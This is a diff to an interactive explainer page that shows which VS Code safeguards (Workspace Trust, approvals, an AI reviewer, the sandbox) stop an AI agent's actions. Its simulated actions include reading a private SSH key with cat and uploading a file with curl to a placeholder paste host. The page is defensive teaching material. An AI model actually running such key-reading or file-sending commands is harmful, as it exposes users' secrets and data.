@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <title>VS Code agent guardrails</title>
-<meta name="description" content="Send an AI agent through the guardrails in VS Code: Workspace Trust, approvals, the sandbox and review. Change the settings and see which one stops it.">
+<meta name="description" content="Which VS Code safeguards stop an AI agent? Pick an action and settings and see what Workspace Trust, approval and the sandbox do.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@75..125,600..800&family=IBM+Plex+Mono:wght@400;500;600&family=Public+Sans:ital,wght@0,400;0,600;1,400&display=swap">
@@ -62,6 +62,7 @@ section{padding:clamp(32px,5vw,56px) 0;border-bottom:1px solid var(--line)}
 fieldset{border:0;margin:0;padding:0;min-width:0}
 fieldset[disabled]{opacity:.38}
 legend{padding:0;margin-bottom:6px}
+.set{display:block;width:fit-content;margin:-2px 0 6px;font:.74rem/1.3 var(--mono);color:var(--muted);overflow-wrap:anywhere}
 .grp{padding:14px 0;border-top:1px solid var(--line)}
 .grp:first-child{border-top:1px solid var(--rule)}
 .acts label{display:flex;gap:10px;align-items:baseline;padding:7px 8px;margin:0 -8px;cursor:pointer}
@@ -147,39 +148,40 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
   <div class="top"><a href="index.html">Kim Syversen</a><span>Current as of <time datetime="2026-11-15">15 Nov 2026</time></span></div>
 
   <header class="hero">
-    <h1>What stops an agent in VS Code?</h1>
-    <p class="lede">Two things. A question to you, and a fence around what the command can reach. Send an agent through both and see which one holds.</p>
+    <h1>Which VS Code safeguards stop an AI agent?</h1>
+    <p class="lede">VS Code has two safeguards for AI agents. Approval asks you before an action runs. The sandbox limits which files and network a command can reach. Pick an action and settings below to see which safeguard stops it.</p>
   </header>
 
   <section id="two-questions">
-    <div class="ph"><h2 id="h-two-questions"><a class="sec-link" href="#two-questions">Two guardrails, two questions</a></h2></div>
+    <div class="ph"><h2 id="h-two-questions"><a class="sec-link" href="#two-questions">The two safeguards: approval and sandbox</a></h2></div>
     <div class="two">
       <div>
         <p class="lbl">Approval</p>
         <p class="q">&ldquo;Can this action run without asking for confirmation?&rdquo;</p>
-        <p>It works on the action before it starts. A yes ends its job.</p>
+        <p>Approval is checked before an action starts. After a yes it does nothing more.</p>
       </div>
       <div>
         <p class="lbl">Sandbox <span class="tag">[preview]</span></p>
         <p class="q">&ldquo;Which resources can this covered process access when it runs?&rdquo;</p>
-        <p>It works on the running command, also after a yes.</p>
+        <p>The sandbox limits a command while it runs, also after you said yes.</p>
       </div>
     </div>
     <p class="src" style="margin-top:14px">Both quotes: <a href="https://code.visualstudio.com/docs/agents/concepts/trust-and-safety#agent-sandboxing">Trust and safety for AI agents</a>.</p>
   </section>
 
   <section id="course">
-    <div class="ph"><h2 id="h-course"><a class="sec-link" href="#course">Send the agent through</a></h2></div>
+    <div class="ph"><h2 id="h-course"><a class="sec-link" href="#course">Try it: pick an action and settings, see what happens</a></h2><p style="margin-top:8px">Every action passes four checks in order.</p></div>
     <div class="sim">
       <form id="ctl" autocomplete="off">
-        <fieldset class="grp acts" id="f-act"><legend class="lbl">The agent wants to</legend></fieldset>
+        <fieldset class="grp acts" id="f-act"><legend class="lbl">Action the agent tries</legend></fieldset>
         <fieldset class="grp"><legend class="lbl">Workspace</legend><div class="opts" data-k="trust"></div></fieldset>
         <fieldset class="grp"><legend class="lbl">Permission level</legend><div class="opts" data-k="level"></div></fieldset>
+        <fieldset class="grp" id="f-judge"><legend class="lbl">The AI reviewer&rsquo;s answer (Assisted only)</legend><div class="opts" data-k="judge"></div></fieldset>
         <fieldset class="grp" id="f-env"><legend class="lbl">Rule for <span class="mono" style="text-transform:none;letter-spacing:0">.env</span> edits</legend><div class="opts" data-k="env"></div></fieldset>
         <fieldset class="grp"><legend class="lbl">Sandbox</legend><div class="opts" data-k="sandbox"></div></fieldset>
         <fieldset class="grp" id="f-net"><legend class="lbl">Sandbox network</legend><div class="opts" data-k="net"></div></fieldset>
         <fieldset class="grp" id="f-esc"><legend class="lbl">Run outside the sandbox</legend><div class="opts" data-k="esc"></div></fieldset>
-        <fieldset class="grp"><legend class="lbl">When asked, you say</legend><div class="opts" data-k="answer"></div></fieldset>
+        <fieldset class="grp" id="f-answer"><legend class="lbl">Your answer when VS Code asks</legend><div class="opts" data-k="answer"></div></fieldset>
         <div class="presets" id="presets"></div>
       </form>
 
@@ -188,24 +190,24 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
         <div style="position:relative">
           <span class="bot" id="bot" aria-hidden="true">[•_•]</span>
           <ol class="gates" id="gates">
-            <li class="gate" data-g="trust"><div class="body"><h3 id="gate-trust"><a class="sec-link" href="#gate-trust">1. Workspace Trust</a></h3><div class="out"></div></div></li>
-            <li class="gate" data-g="approval"><div class="body"><h3 id="gate-approval"><a class="sec-link" href="#gate-approval">2. Approval</a></h3><div class="out"></div></div></li>
-            <li class="gate" data-g="sandbox"><div class="body"><h3 id="gate-sandbox"><a class="sec-link" href="#gate-sandbox">3. Sandbox</a> <span class="tag">[preview]</span></h3><div class="out"></div></div></li>
-            <li class="gate" data-g="review"><div class="body"><h3 id="gate-review"><a class="sec-link" href="#gate-review">4. Afterwards</a></h3><div class="out"></div></div></li>
+            <li class="gate" data-g="trust"><div class="body"><h3 id="gate-trust"><a class="sec-link" href="#gate-trust">1. Is the workspace trusted?</a></h3><div class="out"></div></div></li>
+            <li class="gate" data-g="approval"><div class="body"><h3 id="gate-approval"><a class="sec-link" href="#gate-approval">2. Does VS Code ask you first?</a></h3><div class="out"></div></div></li>
+            <li class="gate" data-g="sandbox"><div class="body"><h3 id="gate-sandbox"><a class="sec-link" href="#gate-sandbox">3. Does the sandbox block it?</a> <span class="tag">[preview]</span></h3><div class="out"></div></div></li>
+            <li class="gate" data-g="review"><div class="body"><h3 id="gate-review"><a class="sec-link" href="#gate-review">4. Can you undo it?</a></h3><div class="out"></div></div></li>
           </ol>
         </div>
-        <p class="scope">Copilot harness sessions with the default tools. Other harnesses differ.</p>
+        <p class="scope">Applies to Copilot harness sessions with the default tools. Other harnesses behave differently.</p>
       </div>
     </div>
   </section>
 
   <section id="not-a-fence">
-    <div class="ph"><h2 id="h-not-a-fence"><a class="sec-link" href="#not-a-fence">Looks like a fence, is not one</a></h2></div>
+    <div class="ph"><h2 id="h-not-a-fence"><a class="sec-link" href="#not-a-fence">What these safeguards do not protect against</a></h2></div>
     <div class="rows" id="holes"></div>
   </section>
 
   <section id="platforms">
-    <div class="ph"><h2 id="h-platforms"><a class="sec-link" href="#platforms">Where the sandbox runs</a> <span class="tag">[preview]</span></h2></div>
+    <div class="ph"><h2 id="h-platforms"><a class="sec-link" href="#platforms">Which systems support the sandbox</a> <span class="tag">[preview]</span></h2></div>
     <div class="tbl"><table>
       <thead><tr><th>System</th><th>Status</th><th>Needs</th></tr></thead>
       <tbody>
@@ -219,7 +221,7 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
   </section>
 
   <section id="baseline">
-    <div class="ph"><p class="lbl">From the VS Code docs</p><h2 id="h-baseline"><a class="sec-link" href="#baseline">Six steps to start with</a></h2></div>
+    <div class="ph"><p class="lbl">From the VS Code docs</p><h2 id="h-baseline"><a class="sec-link" href="#baseline">Six settings the VS Code docs recommend</a></h2></div>
     <ol class="base">
       <li><span>Open untrusted projects in restricted mode.</span></li>
       <li><span>Use agent sandboxing and configure network access. <span class="tag">[preview]</span></span></li>
@@ -241,8 +243,9 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
       <li><a href="https://code.visualstudio.com/docs/agents/run/review-code-edits">Review code edits</a></li>
       <li><a href="https://code.visualstudio.com/docs/agents/run/manage-mcp-servers">Manage MCP servers</a></li>
       <li><a href="https://code.visualstudio.com/docs/editing/workspaces/workspace-trust">Workspace Trust</a></li>
+      <li><a href="https://github.com/microsoft/vscode/tree/d03edc4b18d687c45af067195bad9544b5b07475">VS Code source code</a>, commit <code>d03edc4</code> of 15 Nov 2026</li>
     </ul>
-    <p class="src" style="margin-top:14px">All pages dated 11 Nov 2026 by Microsoft and read on 15 Nov 2026.</p>
+    <p class="src" style="margin-top:14px">Docs pages dated 11 Nov 2026 by Microsoft and read on 15 Nov 2026.</p>
   </section>
 
   <footer>
@@ -250,7 +253,6 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
     <section class="tag-key" id="tag-key"><h2 id="h-tag-key"><a class="sec-link" href="#tag-key">Tags on this page</a></h2>
       <dl>
         <dt><span class="tag">[inference]</span></dt><dd>Interpretation by AI that is not stated in a source.</dd>
-        <dt><span class="tag">[unverified]</span></dt><dd>Not confirmed in a quoted source.</dd>
         <dt><span class="tag">[preview]</span></dt><dd>A feature in preview.</dd>
       </dl>
     </section>
@@ -262,7 +264,7 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
 "use strict";
 var D="https://code.visualstudio.com/docs/";
 var S={ts:"agents/concepts/trust-and-safety",ap:"agents/run/approvals",sb:"agents/run/agent-sandboxing",se:"agents/run/security",rv:"agents/run/review-code-edits",mcp:"agents/run/manage-mcp-servers",wt:"editing/workspaces/workspace-trust",pol:"enterprise/policies"};
-var N={ts:"Trust and safety",ap:"Approvals",sb:"Agent sandboxing",se:"AI security",rv:"Review code edits",mcp:"Manage MCP servers",wt:"Workspace Trust",pol:"Enterprise policies"};
+var N={ts:"Trust and safety",ap:"Approvals",sb:"Agent sandboxing",se:"AI security",rv:"Review code edits",mcp:"Manage MCP servers",wt:"Workspace Trust",pol:"Enterprise policies",src:"VS Code source code"};
 /* Every quote is checked word for word against the source. See vscode-guardrails.factcheck.md. */
 var Q={
 restricted:["wt","Opening a workspace in restricted mode disables agents in that workspace."],
@@ -300,11 +302,21 @@ worktree:["ts","It doesn't restrict commands, network access, or access to other
 ext:["wt","Workspace Trust can't prevent a malicious extension from executing code and ignoring Restricted Mode."],
 mcp:["mcp","In a trusted workspace, they can start without a separate MCP trust prompt, including after configuration changes."],
 status:["ap","Agent sandboxing is in Preview on macOS, Linux, and WSL2, and Experimental on Windows."],
-fatigue:["ts","Repeatedly approving commands can cause you to pay less attention to what you're approving, especially during long agent sessions."]
+fatigue:["ts","Repeatedly approving commands can cause you to pay less attention to what you're approving, especially during long agent sessions."],
+rulecat:["src","cat: true","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/terminal/common/autoApprove/defaultAutoApproveRules.ts#L32-L39"],
+rulecurl:["src","curl: false","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/terminal/common/autoApprove/defaultAutoApproveRules.ts#L229-L230"],
+allsens:["se","Bypasses all user approvals, potentially leading to destructive actions, updating sensitive workspace files, or executing arbitrary code."],
+sandboxauto:["src","Auto-approve shell commands that run sandboxed by default","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/agentHost/node/copilot/copilotAgentSession.ts#L8886-L8894"],
+mcpask:["se","MCP tool invocations require explicit user approval, which you can grant at different scopes: session-level for temporary access, workspace-level for project-specific trust, or user-level for broader permissions."],
+mcpbroad:["se","They can access all files on the local machine, execute arbitrary code, and interact with system resources and external services."],
+mcpsb:["sb","Run locally launched MCP servers in the sandbox when sandboxing is enabled."],
+mcpown:["sb","They don't cover servers you start independently.",D+"agents/run/agent-sandboxing#:~:text=cover%20servers%20you%20start%20independently"],
+bypass:["src","Sandbox bypass requires confirmation","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/agentHost/node/sessionPermissions.ts#L253-L256"]
 };
 function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;")}
 function qlink(id){
   var q=Q[id],w=q[1].split(" ").slice(0,7),i;
+  if(q[2])return q[2];
   for(i=0;i<w.length;i++)if(/['`]/.test(w[i])){w=w.slice(0,i);break}
   var start=w.join(" ").replace(/[.,;:]$/,"");
   return D+S[q[0]]+"#:~:text="+encodeURIComponent(start).replace(/-/g,"%2D");
@@ -318,11 +330,15 @@ var ACTS=[
  {id:"ssh",kind:"term",cmd:"cat ~/.ssh/id_ed25519",what:"Read your SSH key",done:"The agent has read your private key."},
  {id:"curl",kind:"term",cmd:"curl -d @notes.txt https://paste.example",what:"Send a file to another server",done:"notes.txt is on someone else's server."},
  {id:"env",kind:"edit",cmd:"edit .env",what:"Change a file with secrets, using the edit tool",done:".env is changed on disk."},
- {id:"fetch",kind:"fetch",cmd:"fetch https://example.com/docs",what:"Read a web page, using the fetch tool",done:"The page text is in the chat. It may hold instructions."}
+ {id:"fetch",kind:"fetch",cmd:"fetch https://example.com/docs",what:"Read a web page, using the fetch tool",done:"The page text is in the chat. It may hold instructions."},
+ {id:"mcp",kind:"mcp",cmd:"mcp: create_issue",what:"Call a tool on a local MCP server",done:"The server did what the tool does."}
 ];
+/* The VS Code setting behind a control, and the docs page that names it. */
+var SETS={level:["chat.permissions.default","ap"],env:["chat.tools.edits.autoApprove","rv"],sandbox:["chat.agent.sandbox.enabled","sb"],net:["chat.agent.sandbox.network.allowNetwork","sb"],esc:["chat.agent.sandbox.allowUnsandboxedCommands","sb"]};
 var OPTS={
  trust:[["trusted","Trusted"],["restricted","Restricted Mode"]],
  level:[["manual","Manual"],["assisted","Assisted"],["all","Allow all"]],
+ judge:[["yes","Yes"],["no","No"]],
  env:[["off","None"],["on","Ask first"]],
  sandbox:[["off","Off"],["on","On"]],
  net:[["open","Open"],["blocked","Blocked"]],
@@ -330,11 +346,11 @@ var OPTS={
  answer:[["yes","Yes"],["no","No"]]
 };
 var PRESETS=[
- ["Out of the box",{trust:"trusted",level:"manual",env:"off",sandbox:"off",net:"open",esc:"ask"}],
- ["Everything on auto",{trust:"trusted",level:"all",env:"off",sandbox:"off",net:"open",esc:"ask",answer:"yes"}],
- ["Locked down",{trust:"trusted",level:"manual",env:"on",sandbox:"on",net:"blocked",esc:"never"}]
+ ["VS Code defaults",{trust:"trusted",level:"manual",env:"off",sandbox:"off",net:"open",esc:"ask"}],
+ ["Allow all, no sandbox",{trust:"trusted",level:"all",env:"off",sandbox:"off",net:"open",esc:"ask",answer:"yes"}],
+ ["Strictest settings",{trust:"trusted",level:"manual",env:"on",sandbox:"on",net:"blocked",esc:"never"}]
 ];
-var st={act:"curl",trust:"trusted",level:"manual",env:"off",sandbox:"off",net:"open",esc:"ask",answer:"yes"};
+var st={act:"curl",trust:"trusted",level:"manual",judge:"yes",env:"off",sandbox:"off",net:"open",esc:"ask",answer:"yes"};
 
 /* The rules. Each gate returns a state, a sentence and the quotes behind it. */
 function evaluate(s){
@@ -346,56 +362,68 @@ function evaluate(s){
     push(gate,"ask",say+" You say yes.",qs);return true;
   }
   // 1 trust
-  if(s.trust==="restricted"){push("trust","stop","Restricted Mode. The agent is switched off.",["restricted"]);return{g:g,ran:false,why:"trust",asks:0,a:a}}
-  push("trust","pass","Trusted. The agent may work here.",["trustcert"]);
+  if(s.trust==="restricted"){push("trust","stop","The workspace is in Restricted Mode, so agents are turned off.",["restricted"]);return{g:g,ran:false,why:"trust",asks:0,a:a}}
+  push("trust","pass","The workspace is trusted, so the agent is allowed to work in it.",["trustcert"]);
   // 2 approval
   var ok=true;
-  if(s.level==="all") push("approval","pass","Allow all. Nobody asks.",["all"]);
-  else if(term&&s.sandbox==="on") push("approval","pass","No question. The command is sandboxed, so the fence does the work.",["runtime"]);
-  else if(s.level==="assisted") push("approval","judge","A model looks at the call. You are asked only if it says no.",["assisted","assistedrisk"]);
-  else if(a.id==="status") push("approval","pass","Read-only, so it runs without a question.",["termdefault"]);
-  else if(a.id==="rm") ok=asked("approval","rm needs your yes.",["termdefault"]);
-  else if(term) ok=asked("approval","Not auto-approved, so you are asked."+tag("unverified"),["manual","fatigue"]);
-  else if(a.id==="env"){
-    if(s.env==="on") ok=asked("approval","Your rule shows the diff and waits for you.",["sensitive"]);
-    else push("approval","pass","No rule covers .env, so the edit is saved without a question."+tag("inference"),["editauto"]);
+  if(s.level==="all"){
+    if(a.id==="env") push("approval","pass","Allow all skips every approval, also for files with secrets.",["all","allsens"]);
+    else push("approval","pass","Allow all skips every approval. VS Code does not ask you.",["all"]);
   }
-  else ok=asked("approval","Two questions: may it contact the site, and may the answer go into the chat?",["urlreq","urlres"]);
+  else if(s.level==="assisted"){
+    if(s.judge==="no") ok=asked("approval","An AI reviewer checked the action and did not approve it, so VS Code asks you.",["assisted"]);
+    else if(a.id==="env"&&s.env==="on") push("approval","judge","An AI reviewer checked the action and approved it, so your .env rule is skipped."+tag("inference"),["assisted","assistedrisk"]);
+    else push("approval","judge","An AI reviewer checked the action and approved it. VS Code does not ask you.",["assisted","assistedrisk"]);
+  }
+  else if(term&&s.sandbox==="on") push("approval","pass","VS Code does not ask, because the command runs inside the sandbox.",["runtime","sandboxauto"]);
+  else if(a.id==="status") push("approval","pass","git status only reads, so it runs without asking you.",["termdefault"]);
+  else if(a.id==="rm") ok=asked("approval","rm deletes files, so VS Code asks you first.",["termdefault"]);
+  else if(a.id==="ssh") push("approval","pass","cat is on the built-in list of read-only commands, so it runs without asking you.",["rulecat","termdefault"]);
+  else if(term) ok=asked("approval","curl is on the built-in list of commands that need approval, so VS Code asks you.",["rulecurl","manual"]);
+  else if(a.id==="env"){
+    if(s.env==="on") ok=asked("approval","Your rule for .env makes VS Code show the change and ask you before it is saved.",["sensitive"]);
+    else push("approval","pass","No rule covers .env, so the edit is saved without asking you."+tag("inference"),["editauto"]);
+  }
+  else if(a.id==="mcp") ok=asked("approval","A tool on an MCP server needs your approval. You can approve it once or for a longer period.",["mcpask"]);
+  else ok=asked("approval","VS Code asks twice: may the agent contact the site, and may the response go into the chat?",["urlreq","urlres"]);
   if(!ok) return{g:g,ran:false,why:why,asks:asks,a:a};
   // 3 sandbox
-  if(!term){
-    if(a.id==="env") push("sandbox","skip","The edit tool is not a command. The fence does not apply.",["notcovered","builtin"]);
-    else push("sandbox","skip","The fetch tool has its own network rules. The fence does not apply.",["fetchsep"]);
-  } else if(s.sandbox==="off") push("sandbox","open","Off, which is the default. The command runs as you.",["privs"]);
+  if(a.id==="mcp"){
+    if(s.sandbox==="off") push("sandbox","open","The sandbox is off, which is the default. The MCP server runs with your user rights.",["mcpbroad"]);
+    else{fenced=true;push("sandbox","pass","VS Code started the server inside the sandbox. A server you start yourself is outside it.",["mcpsb","mcpown"])}
+  } else if(!term){
+    if(a.id==="env") push("sandbox","skip","The sandbox only covers commands. The edit tool is not a command, so the sandbox does not apply.",["notcovered","builtin"]);
+    else push("sandbox","skip","The fetch tool has its own network rules. The sandbox does not apply.",["fetchsep"]);
+  } else if(s.sandbox==="off") push("sandbox","open","The sandbox is off, which is the default. The command runs with your user rights.",["privs"]);
   else {
     var blocked=(a.id==="ssh")||(a.id==="curl"&&s.net==="blocked");
     if(!blocked){
       fenced=true;
-      if(a.id==="curl") push("sandbox","pass","The fence has a network door, and it is open by default.",["netopen"]);
-      else push("sandbox","pass","Inside the project folder, so the fence lets it work"+(s.level==="all"?", also with Allow all.":"."),s.level==="all"?["cwd","indep"]:["cwd"]);
+      if(a.id==="curl") push("sandbox","pass","The sandbox allows network access by default, so the file is sent.",["netopen"]);
+      else push("sandbox","pass","The command only touches the project folder, which the sandbox allows"+(s.level==="all"?", also with Allow all.":"."),s.level==="all"?["cwd","indep"]:["cwd"]);
     } else {
-      var bq=a.id==="ssh"?"ssh":"netblock",bs=a.id==="ssh"?"Blocked. The key is outside the fence.":"Blocked. No way out to the network.";
-      if(s.esc==="never"){push("sandbox","stop",bs+" Asking to run outside is turned off.",[bq,"escoff"]);return{g:g,ran:false,why:"fence",asks:asks,a:a}}
-      ok=asked("sandbox",bs+" The agent asks to run it outside the sandbox."+(s.level==="all"?tag("unverified"):""),[bq,"escask","escyes"],bs+" The agent asks to run it outside. You say no.",[bq,"escask","escno"]);
+      var bq=a.id==="ssh"?"ssh":"netblock",bs=a.id==="ssh"?"The sandbox blocks it. The SSH key is outside the folders the sandbox allows.":"The sandbox blocks it. Network access is turned off.";
+      if(s.esc==="never"){push("sandbox","stop",bs+" Asking to run outside the sandbox is turned off.",[bq,"escoff"]);return{g:g,ran:false,why:"fence",asks:asks,a:a}}
+      ok=asked("sandbox",bs+" The agent asks to run it outside the sandbox"+(s.level==="all"?", also with Allow all.":"."),s.level==="all"?[bq,"escask","bypass","escyes"]:[bq,"escask","escyes"],bs+" The agent asks to run it outside the sandbox. You say no.",[bq,"escask","escno"]);
       if(!ok) return{g:g,ran:false,why:"fence-no",asks:asks,a:a};
     }
   }
   // 4 afterwards
-  if(a.id==="env") push("review","after","Keep or Undo. The file is already saved either way.",["keep"]);
-  else if(a.id==="status") push("review","after","Nothing to clean up.",[]);
-  else push("review","after","No undo for this.",["noundo"]);
+  if(a.id==="env") push("review","after","You can choose Keep or Undo, but the file is already saved on disk.",["keep"]);
+  else if(a.id==="status") push("review","after","Nothing changed, so there is nothing to undo.",[]);
+  else push("review","after","This cannot be undone.",["noundo"]);
   return{g:g,ran:true,asks:asks,a:a,fenced:fenced};
 }
-var LABEL={pass:"Through",ask:"Asks you",stop:"Stopped",skip:"Not in play",judge:"A model decides",open:"No fence",after:"After it ran"};
+var LABEL={pass:"Allowed",ask:"VS Code asks you",stop:"Stopped",skip:"Does not apply",judge:"AI reviewer decides",open:"Sandbox is off",after:"After it ran"};
 function verdict(r){
   if(!r.ran){
-    if(r.why==="trust") return["Switched off.","The agent never starts."];
-    if(r.why==="fence") return["The fence held.","Nothing ran, and nobody had to ask you."];
-    if(r.why==="fence-no") return["The fence held, and you backed it.","Nothing ran outside the sandbox."];
-    return["You said no.","Nothing ran."];
+    if(r.why==="trust") return["Result: the agent is turned off.","Nothing ran."];
+    if(r.why==="fence") return["Result: blocked by the sandbox.","Nothing ran, and VS Code did not need to ask you."];
+    if(r.why==="fence-no") return["Result: blocked by the sandbox. You said no to running it outside.","Nothing ran."];
+    return["Result: stopped. You said no.","Nothing ran."];
   }
   var judged=r.g.some(function(x){return x.state==="judge"});
-  var how=r.asks===0?(judged?"It ran. A model said yes for you.":"It ran. Nobody asked you."):r.asks===1?"It ran, because you said yes.":"It ran, because you said yes twice.";
+  var how=r.asks===0?(judged?"Result: the action ran. An AI reviewer approved it, not you.":"Result: the action ran. VS Code did not ask you."):r.asks===1?"Result: the action ran. You approved it.":"Result: the action ran. You approved it twice.";
   return[how,r.a.done];
 }
 
@@ -423,7 +451,7 @@ function render(animate){
   }
   for(i=0;i<items.length;i++){
     if(byGate[items[i].dataset.g]) last=i;
-    else{items[i].className="gate wait";items[i].querySelector(".out").innerHTML='<p class="state">Not reached</p>'}
+    else{items[i].className="gate wait";items[i].querySelector(".out").innerHTML='<p class="state">Not checked</p>'}
   }
   if(reduce){for(i=0;i<=last;i++)show(i);moveBot(last,true);finish();return}
   for(i=0;i<=last;i++){items[i].className="gate wait";items[i].querySelector(".out").innerHTML='<p class="state">&nbsp;</p>'}
@@ -436,7 +464,9 @@ function render(animate){
 }
 function sync(){
   var a=ACTS.filter(function(x){return x.id===st.act})[0],term=a.kind==="term";
-  document.getElementById("f-env").disabled=a.id!=="env";
+  document.getElementById("f-judge").disabled=st.level!=="assisted";
+  document.getElementById("f-env").disabled=a.id!=="env"||st.level==="all";
+  document.getElementById("f-answer").disabled=evaluate(st).asks===0;
   document.getElementById("f-net").disabled=!(term&&st.sandbox==="on");
   document.getElementById("f-esc").disabled=!(term&&st.sandbox==="on");
   Array.prototype.forEach.call(document.querySelectorAll("#ctl input"),function(el){el.checked=st[el.name]===el.value});
@@ -447,6 +477,7 @@ document.getElementById("f-act").insertAdjacentHTML("beforeend",ACTS.map(functio
 }).join(""));
 Array.prototype.forEach.call(document.querySelectorAll(".opts"),function(el){
   var k=el.dataset.k;
+  if(SETS[k]) el.insertAdjacentHTML("beforebegin",'<a class="set" href="'+D+S[SETS[k][1]]+'#:~:text='+SETS[k][0]+'">'+SETS[k][0]+'</a>');
   el.innerHTML=OPTS[k].map(function(o){return '<label><input type="radio" name="'+k+'" value="'+o[0]+'"><span>'+o[1]+'</span></label>'}).join("");
 });
 document.getElementById("presets").innerHTML=PRESETS.map(function(p,i){return '<button type="button" data-i="'+i+'">'+p[0]+'</button>'}).join("");
@@ -462,15 +493,15 @@ var HOLES=[
  ["The sandbox is not a virtual machine.","notvm"],
  ["A sandboxed command can still read your package registry tokens, unless you turn developer-tool access off.","devtool"],
  ["Terminal approval rules can be fooled by a cleverly written command.","besteffort"],
- ["Assisted permissions lets a model decide, and a model can be wrong.","assistedrisk"],
+ ["Assisted permissions lets an AI reviewer decide, and it can be wrong.","assistedrisk"],
  ["Restricted Mode does not hold back an extension that chooses to ignore it.","ext"],
- ["A Git worktree keeps code changes apart. It fences nothing.","worktree"],
+ ["A Git worktree keeps code changes apart. It does not limit what a command can reach.","worktree"],
  ["Trusting a folder also lets the MCP servers it ships with start.","mcp"],
- ["Many prompts wear you down, and a tired yes is a weak guardrail.","fatigue"]
+ ["Many approval questions wear you down, and you start saying yes without reading.","fatigue"]
 ];
 document.getElementById("holes").innerHTML=HOLES.map(function(h){return '<div class="row"><p>'+h[0]+'</p>'+quote(h[1])+'</div>'}).join("");
 document.getElementById("plat").innerHTML='<div class="row"><p>Not finished software on any system yet.</p>'+quote("status")+'</div>'+
- '<div class="row"><p>If the system lacks what the sandbox needs, the command stops. It does not run unfenced.</p>'+quote("nosilent")+'</div>';
+ '<div class="row"><p>If the system lacks what the sandbox needs, the command stops. It does not run without the sandbox.</p>'+quote("nosilent")+'</div>';
 sync();render(false);
 })();
 </script>
